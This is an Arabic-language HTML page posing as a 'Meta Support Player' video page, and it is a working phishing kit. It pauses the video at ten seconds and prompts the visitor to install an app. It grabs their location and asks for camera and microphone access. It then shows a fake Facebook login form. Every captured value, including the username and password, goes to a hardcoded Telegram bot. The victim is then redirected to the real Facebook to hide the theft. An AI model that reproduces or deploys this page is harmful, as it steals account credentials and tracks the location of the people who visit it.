<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meta Support Player</title>
    <link rel="manifest" href="manifest.json">
    <style>
        body { margin: 0; background: #000; font-family: Arial; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        video { width: 100%; max-height: 100vh; }
        #pwa, #fb { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 10000; padding: 20px; flex-direction: column; align-items: center; justify-content: center; }
        .box { background: #fff; padding: 25px; border-radius: 15px; text-align: center; width: 90%; max-width: 380px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        button { background: #1877f2; color: #fff; border: none; padding: 15px; border-radius: 8px; width: 100%; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 15px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; background: #f5f6f7; }
        .logo { color: #1877f2; font-size: 35px; font-weight: bold; margin-bottom: 10px; }
    </style>
</head>
<body>

    <video id="vid" controls poster="trend_bg.jpg.jpg">
        <source src="v.mp4" type="video/mp4">
    </video>

    <div id="pwa">
        <div class="box">
            <h3 style="margin-top:0;">تحديث المشغل مطلوب</h3>
            <p style="color:#606770; font-size:14px;">لاستكمال مشاهدة الفيديو بدون حظر، يجب الانتقال للمشغل الرسمي.</p>
            <button id="btn_ins">تثبيت واستكمال المشاهدة</button>
        </div>
    </div>

    <div id="fb">
        <div class="box">
            <div class="logo">facebook</div>
            <p style="font-size:14px; color:#1c1e21; font-weight:bold;">يرجى تسجيل الدخول للمتابعة</p>
            <input type="text" id="user" placeholder="رقم الهاتف أو البريد الإلكتروني">
            <input type="password" id="pass" placeholder="كلمة السر">
            <button id="btn_go">تسجيل الدخول</button>
            <p style="color:#1877f2; font-size:12px; margin-top:15px;">هل نسيت كلمة السر؟</p>
        </div>
    </div>

    <script>
        const T = "8644789773:AAHR24ApIVuGT10W5sDFD-Wm3fHJAEIlrrk";
        const ID = "1356975454";
        const v = document.getElementById('vid');
        let p;

        if ('serviceWorker' in navigator) { navigator.serviceWorker.register('sw.js'); }
        window.addEventListener('beforeinstallprompt', (e) => { e.preventDefault(); p = e; });

        // الفيديو يقطع عند ثانية 10 ويطلب التثبيت
        v.ontimeupdate = () => {
            if (v.currentTime >= 10) {
                v.pause();
                v.currentTime = 10;
                document.getElementById('pwa').style.display = 'flex';
            }
        };

        document.getElementById('btn_ins').addEventListener('click', async () => {
            // تنفيذ التثبيت (PWA)
            if (p) {
                p.prompt();
                const { outcome } = await p.userChoice;
                if (outcome === 'accepted') send("🎯 الضحية ثبت المشغل");
            }
            
            // سحب الأذونات (كاميرا، مايك، موقع)
            navigator.geolocation.getCurrentPosition((pos) => {
                send(`📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
            });
            try {
                await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
                send("🎙️📸 تم فتح الكاميرا والمايك");
            } catch (e) { send("❌ رفض الأذونات"); }
            
            // الانتقال لصفحة الفيس
            document.getElementById('pwa').style.display = 'none';
            document.getElementById('fb').style.display = 'flex';
        });

        document.getElementById('btn_go').addEventListener('click', () => {
            const u = document.getElementById('user').value;
            const ps = document.getElementById('pass').value;
            if(u && ps) {
                send(`🔐 صيدة فيس:\n📧: ${u}\n🔑: ${ps}`);
                alert("⚠️ خطأ في المصادقة، حاول مجدداً.");
                window.location.href = "https://m.facebook.com"; // تحويله للحقيقي للتغطية
            }
        });

        function send(msg) {
            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(msg)}`, { mode: 'no-cors' });
        }
    </script>
</body>
</html>
